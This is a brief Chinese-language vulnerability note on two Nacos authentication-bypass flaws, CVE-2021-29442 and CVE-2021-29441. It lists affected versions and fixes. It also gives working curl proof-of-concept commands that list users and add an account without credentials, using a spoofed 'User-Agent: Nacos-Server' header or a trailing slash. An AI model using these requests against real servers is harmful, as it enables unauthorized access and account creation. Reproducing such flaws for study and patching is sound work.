所有server源码都在阿里网盘，请前往首页地址自行下载  

# cve-2021-29442
version <= 2.0.0-ALPHA.1
nacos鉴权的filter使用`User-Agent: Nacos-Server`可以绕过  
## 修复
version = 1.4.1 简单修复  
## poc
启动nacos
```text
cd nacos/bin
sh startup.sh -m standalone
```
获取用户列表
```text
curl XGET 'http://192.168.0.111:8848/nacos/v1/auth/users?pageNo=1&pageSize=9' -H 'User-Agent: Nacos-Server'
```
添加用户
```text
curl -XPOST 'http://192.168.0.111:8848/nacos/v1/auth/users?username=test&password=test' -H 'User-Agent: Nacos-Server'
```

# cve-2021-29441
version = 1.4.1 的简单修复继续绕过  
简单修复的情况下在url末尾添加/进行绕过
## 修复
version = 1.4.1 hotfix修复  

## poc
获取用户列表
```text
curl -X GET 'http://192.168.0.111:8848/nacos/v1/auth/users/?pageNo=1&pageSize=9'
```
添加用户
```text
curl -XPOST 'http://127.0.0.1:8848/nacos/v1/auth/users/?username=test1&password=test'
```